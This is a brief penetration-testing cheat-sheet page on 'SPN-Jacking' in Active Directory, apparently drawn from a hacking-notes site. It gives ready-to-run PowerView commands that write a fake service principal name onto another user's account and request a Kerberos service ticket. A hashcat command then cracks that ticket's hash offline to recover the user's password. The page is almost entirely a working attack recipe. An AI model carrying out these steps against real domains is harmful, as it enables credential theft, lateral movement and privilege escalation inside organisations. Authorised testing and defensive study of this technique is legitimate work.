# SPN-Jacking

If the current user has a right to write the SPN of another user, we can achieve lateral movement or privilege escalation.

### Exploit <a href="#exploit" id="exploit"></a>

#### 1. Set SPN and Get the Hash of the Service Ticket <a href="#id-1-set-spn-and-get-the-hash-of-the-service-ticket" id="id-1-set-spn-and-get-the-hash-of-the-service-ticket"></a>

```
# 1. Import PowerView module
. .\PowerView.ps1

# 2. Set SPN
Set-DomainObject -Identity <OTHER_USER> -SET @{serviceprincipalname='evil/evil'}

# 3. Request sercice ticket
Get-DomainSPNTicket -SPN evil/evil
```

#### 2. Crack the Hash <a href="#id-2-crack-the-hash" id="id-2-crack-the-hash"></a>

After that, we retrieve the hash of the ticket, so crack it on your local machine:

```
# -m 13100: Replace it with the appropriate number depending on the algorithm.
hashcat -a 0 -m 13100 hash.txt wordlist.txt
```

### References <a href="#references" id="references"></a>

* [The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/spn-jacking)
